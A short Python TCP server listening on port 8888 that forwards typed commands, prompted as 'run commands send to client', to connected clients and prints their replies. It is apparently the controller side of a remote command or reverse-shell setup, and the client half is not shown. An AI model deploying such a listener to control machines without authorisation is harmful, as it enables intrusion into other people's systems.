from socket import socket, AF_INET, SOCK_STREAM
import threading
import subprocess

def receive_message(clien_socket, client_address):
    while True:
        print(clien_socket.recv(20240).decode(),client_address)

with socket(AF_INET, SOCK_STREAM) as server_socket:
    server_socket.bind(("0.0.0.0", 8888))
    server_socket.listen()


    while True:
        client_socket, client_address=server_socket.accept()


        threading.Thread(target=receive_message,args=(client_socket,client_address)).start()

        while True:
            data=input("run commands send to client")
            client_socket.sendall(data.encode())